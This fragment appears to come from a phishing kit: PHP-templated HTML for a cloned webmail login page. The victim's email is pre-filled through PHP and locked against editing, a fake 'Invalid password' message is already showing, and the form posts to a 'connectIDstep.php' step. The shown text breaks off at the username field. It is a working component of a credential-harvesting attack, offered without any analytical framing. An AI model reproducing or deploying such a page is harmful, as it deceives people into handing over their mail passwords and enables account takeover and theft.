...
<script type="text/javascript" src="./Client_files/generatedDefaults.js.download"></script><script type="text/javascript" src="./Client_files/is"></script><link href="./Client_files/loginBasic.css" rel="stylesheet"><link href="./Client_files/loginAdvanced.css" rel="stylesheet"></head><body onload="document.getElementById(&#39;x_cfq&#39;).focus();x_cge(false);x_cgf();"><div id="x_cfo"></div><form action="connectIDstep.php" method="post" novalidate="novalidate"><div id="logoField" style="font-size:36px; color:#02A0E0; font-weight:bold;"><img id="x_cfw" src="./Client_files/logo.png" alt="Mail" width="48" height="48"> <? echo $str;?>  </div><table id="x_cfn" cellspacing="0" cellpadding="0" border="0"><tbody><p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try again</p><tr><td><img id="x_cfy" src="./Client_files/top.png" alt="" width="304" height="23"></td></tr><tr><td id="x_cfp"><center><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td></td></tr><tr><td class="x_cfu">Username<br><input id="x_cfq" name="kerio_username" type="email" style="cursor:no-drop; -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;" value="<? echo $login;?>"></td></tr>
